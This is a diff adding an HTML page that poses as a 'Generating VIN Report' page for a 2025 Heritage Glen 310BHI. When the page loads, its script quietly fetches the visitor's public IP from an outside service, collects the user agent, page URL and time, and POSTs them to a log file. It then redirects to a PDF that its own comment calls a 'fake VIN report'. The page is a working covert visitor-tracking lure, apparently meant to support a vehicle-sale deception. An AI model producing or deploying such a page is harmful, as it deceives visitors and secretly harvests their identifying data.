@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VIN Report - 2025 Heritage Glen 310BHI</title>
+    <script>
+        function logIP() {
+            fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                let ip = data.ip;
+                let userAgent = navigator.userAgent;
+                let pageUrl = window.location.href;
+                let logData = `IP: ${ip} | User Agent: ${userAgent} | Page: ${pageUrl} | Time: ${new Date().toISOString()}\n`;
+                
+                fetch('log.txt', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'text/plain'},
+                    body: logData
+                });
+                
+                // Redirect to the fake VIN report
+                setTimeout(() => {
+                    window.location.href = '2025_Heritage_Glen_310BHI.pdf';  // Replace with actual PDF file path
+                }, 1000);
+            });
+        }
+    </script>
+</head>
+<body onload="logIP()">
+    <h2>Generating VIN Report...</h2>
+    <p>Please wait while we verify the vehicle details.</p>
+</body>
+</html>
